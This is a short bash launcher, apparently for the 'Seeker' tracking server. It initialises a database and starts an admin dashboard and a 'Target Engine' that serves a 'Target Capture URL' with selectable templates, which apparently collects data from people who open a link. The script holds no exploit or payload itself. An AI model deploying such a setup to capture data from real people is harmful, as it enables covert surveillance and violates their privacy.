#!/bin/bash
set -e

echo "============================================="
echo "   SEEKER TELEMETRY & TRACKING SERVER        "
echo "============================================="

# Ensure directories exist
mkdir -p logs db

# Initialize SQLite database
echo "[+] Initializing SQLite database (db/seeker.db)..."
python3 db_manager.py

# Export environment defaults
export PORT="${PORT:-8080}"
export ADMIN_PORT="${ADMIN_PORT:-8088}"
export TEMPLATE="${TEMPLATE:-2}"
export DEBUG_HTTP="${DEBUG_HTTP:-1}"

# Cleanup any stale PID files
rm -f pid logs/php.log logs/info.txt logs/result.txt

# Trap termination signals
cleanup() {
    echo "[!] Caught signal, shutting down services..."
    if [ -n "$ADMIN_PID" ]; then
        kill "$ADMIN_PID" 2>/dev/null || true
    fi
    python3 -c "import tracker_service; tracker_service.stop_tracker()" 2>/dev/null || true
    wait 2>/dev/null || true
    echo "[+] Graceful shutdown complete."
    exit 0
}

trap cleanup SIGINT SIGTERM

# Start Admin Dashboard Server
echo "[+] Starting Admin Dashboard on port $ADMIN_PORT..."
python3 admin_server.py &
ADMIN_PID=$!

# Small delay to ensure admin starts cleanly
sleep 1

# Initialize Seeker Target Engine through supervisor
echo "[+] Initializing Seeker Target Engine via tracker supervisor..."
python3 -c "import tracker_service; tracker_service.start_tracker({'port': int('$PORT'), 'template_id': int('$TEMPLATE')})"

echo "[✔] Both services active!"
echo "    - Target Capture URL: http://0.0.0.0:$PORT"
echo "    - Admin Dashboard:    http://0.0.0.0:$ADMIN_PORT"

# Wait for Admin process to supervise container lifetime
wait "$ADMIN_PID"
cleanup
